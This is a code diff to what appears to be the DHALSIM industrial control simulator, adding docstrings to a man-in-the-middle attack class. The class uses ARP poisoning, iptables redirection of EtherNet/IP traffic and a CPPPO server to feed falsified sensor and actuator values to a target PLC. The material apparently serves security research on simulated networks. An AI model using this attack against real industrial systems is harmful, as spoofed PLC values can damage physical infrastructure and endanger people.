@@ -6,20 +6,21 @@ import time
 from pathlib import Path
 from typing import List
 
-import fnfqueue
-
 from dhalsim.network_attacks.utilities import launch_arp_poison, restore_arp
 from synced_attack import SyncedAttack
 
 
 class MitmAttack(SyncedAttack):
     """
-    This is a Man In The Middle attack class. This kind of attack will modify
-    the data that is passed around in packages on the network, in order to
-    change the values of tags before they reach the requesting PLC.
+    This is a Man In The Middle attack. This attack will respond to request for
+    the target PLC.
 
-    A man in the middle attack always sits in between a PLC and its
-    corresponding gateway.
+    It does this by starting its own CPPPO server, and replying to the request with its
+    own value. It also uses CPPPO to request the real values from the target PLC.
+
+    When preforming this attack, you can use either an offset, or an absolute value.
+
+    When using this type of attack, you can modify the values of individual tags.
 
     :param intermediate_yaml_path: The path to the intermediate YAML file
     :param yaml_index: The index of the attack in the intermediate YAML
@@ -28,7 +29,6 @@ class MitmAttack(SyncedAttack):
     def __init__(self, intermediate_yaml_path: Path, yaml_index: int):
         super().__init__(intermediate_yaml_path, yaml_index)
         os.system('sysctl net.ipv4.ip_forward=1')
-        self.queue = fnfqueue.Connection()
         self.thread = None
         self.server = None
         self.run_thread = False
@@ -36,7 +36,19 @@ class MitmAttack(SyncedAttack):
         self.dict_lock = threading.Lock()
 
     def setup(self):
-        # Add the iptables rules
+        """
+        This function start the network attack.
+
+        It first sets up the iptables on the attacker node route the packets that orignally
+        where for the target PLC, to the attacker.
+        It also drops the icmp packets, to avoid network packets skipping the
+        attacker node.
+
+        Afterwards it launches the ARP poison, which basically tells the network that the attacker
+        is the PLC, and it tells the PLC that the attacker is the router.
+
+        Finally, it launches the thread that will respond to the CPPPO requests.
+        """
         os.system('iptables -t nat -A PREROUTING -p tcp -d ' + self.target_plc_ip +
                   ' --dport 44818 -j DNAT --to-destination ' + self.attacker_ip + ':44818')
         os.system('iptables -A FORWARD -p icmp -j DROP')
@@ -66,6 +78,7 @@ class MitmAttack(SyncedAttack):
                           f"{self.intermediate_attack['gateway_ip']}")
 
     def receive_original_tags(self):
+        """Update the :code:`tags` dict to the newest original values from the target PLC"""
         request_tags = self.intermediate_plc['actuators'] + self.intermediate_plc['sensors']
 
         cmd = ['/usr/bin/python2', '-m', 'cpppo.server.enip.client', '--print', '--address',
@@ -95,6 +108,10 @@ class MitmAttack(SyncedAttack):
             self.logger.error(f"ERROR MITM Attack ENIP send_multiple: {error}")
 
     def update_tags_dict(self):
+        """
+        Update the :code:`tags` dict to the original values from the target PLC,
+        and then overwrite them with the fake values and offsets.
+        """
         # Acquire the lock
         self.dict_lock.acquire()
 
@@ -113,6 +130,12 @@ class MitmAttack(SyncedAttack):
         self.dict_lock.release()
 
     def make_client_cmd(self) -> List[str]:
+        """
+        Put all the tags together into a command that starts CPPPO and responds to request.
+
+        :return: The command that starts the CPPPO client
+        :rtype: List[str]
+        """
         cmd = ['/usr/bin/python2', '-m', 'cpppo.server.enip.client', '--print', '--address',
                str(self.attacker_ip)]
 
@@ -128,6 +151,7 @@ class MitmAttack(SyncedAttack):
         return cmd
 
     def cpppo_thread(self):
+        """Start the CPPPO client to respond to requests."""
         while self.run_thread:
             cmd = self.make_client_cmd()
             self.logger.debug(f"MITM Attack Client: {cmd}")
@@ -140,10 +164,20 @@ class MitmAttack(SyncedAttack):
             time.sleep(0.05)
 
     def interrupt(self):
+        """
+        This function will be called when we want to stop the attacker. It calls the teardown
+        function if the attacker is in state 1 (running)
+        """
         if self.state == 1:
             self.teardown()
 
     def teardown(self):
+        """
+        This function will undo the actions done by the setup function.
+
+        It first restores the arp poison, to point to the original router and PLC again. Afterwards
+        it will delete the iptable rules and stop the thread.
+        """
         restore_arp(self.target_plc_ip, self.intermediate_attack['gateway_ip'])
         self.logger.debug(f"MITM Attack ARP Restore between {self.target_plc_ip} and "
                           f"{self.intermediate_attack['gateway_ip']}")
@@ -160,6 +194,7 @@ class MitmAttack(SyncedAttack):
         self.thread.join()
 
     def attack_step(self):
+        """When the attack is running, it will update the tags dict with the most recent values."""
         if self.state == 1:
             self.update_tags_dict()
 
